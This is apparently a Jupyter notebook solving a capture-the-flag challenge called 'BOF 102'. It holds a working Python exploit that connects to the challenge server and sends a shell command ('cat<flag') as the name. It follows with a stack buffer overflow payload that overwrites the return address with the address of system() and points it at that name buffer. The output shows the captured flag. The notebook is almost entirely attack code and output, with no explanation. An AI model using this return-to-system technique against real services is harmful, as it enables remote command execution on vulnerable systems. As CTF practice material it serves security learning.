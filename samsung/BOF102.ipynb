{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "7776c964",
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "address_of_system:134513712, address_of_name:134520940, bits:32, delta_offset:4, order:(little)\n",
      "\"[b'!!!____________________0\\x84\\x04\\x08l\\xa0\\x04\\x08l\\xa0\\x04\\x08l\\xa0\\x04\\x08!!!\\n', b'Good.\\nSCTF{574ck_iS_g00d_bu7_d4n9erOu5}\\n', b'']\"\n"
     ]
    }
   ],
   "source": [
    "import socket\n",
    "from Crypto.Util.number import long_to_bytes\n",
    "\n",
    "class ServerConnection:\n",
    "    def __init__(self):\n",
    "        self.HOST = \"bof102.sstf.site\"\n",
    "        self.PORT = 1337\n",
    "        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "        self.socket.connect((self.HOST, self.PORT))\n",
    "\n",
    "    def send(self, desired_command, payload):\n",
    "        prompt = self.socket.recv(1024)\n",
    "        assert prompt.decode() == \"Welcome to BOF 102!\\n\", prompt\n",
    "\n",
    "        prompt = self.socket.recv(1024)\n",
    "        assert prompt.decode() == \"What's your name?\\nName > \", prompt\n",
    "        name = desired_command.encode() + b'\\n'\n",
    "        self.socket.sendall(name)\n",
    "\n",
    "        prompt = self.socket.recv(1024)\n",
    "        prompt = self.socket.recv(1024)\n",
    "        assert prompt.decode() == 'Do you wanna build a snowman?\\n > ', prompt\n",
    "        self.socket.sendall(payload + b'\\n')\n",
    "\n",
    "        # Receive the response\n",
    "        responses = []\n",
    "        responses.append(self.socket.recv(1024))\n",
    "        responses.append(self.socket.recv(1024))\n",
    "        responses.append(self.socket.recv(1024))\n",
    "        return responses\n",
    "\n",
    "    def close(self):\n",
    "        self.socket.close()\n",
    "        \n",
    "desired_command = 'cat<flag'\n",
    "offset = 16\n",
    "\n",
    "filler = b'_'\n",
    "for address_of_system in [0x08048430]:\n",
    "    for address_of_name in [0x804a06c]:\n",
    "        for bits in [32]:\n",
    "            for delta_offset in range(4, 8, 4):\n",
    "                for order in ('little',):\n",
    "                    connection = ServerConnection()\n",
    "\n",
    "                    payload = filler * (offset + delta_offset)\n",
    "                    payload += address_of_system.to_bytes(bits//8, order)\n",
    "                    payload += address_of_name.to_bytes(bits//8, order)\n",
    "                    payload += address_of_name.to_bytes(bits//8, order)\n",
    "                    payload += address_of_name.to_bytes(bits//8, order)\n",
    "\n",
    "                    # print(payload)\n",
    "                    # Now you can send this payload as input to the program\n",
    "                    response = connection.send(desired_command, payload)\n",
    "                    print(f'address_of_system:{address_of_system}, address_of_name:{address_of_name}, bits:{bits}, delta_offset:{delta_offset}, order:({order})')\n",
    "                    print(f'\"{response}\"')\n",
    "                    # print()\n",
    "                    connection.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1b186cbd",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "py310",
   "language": "python",
   "name": "py310"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
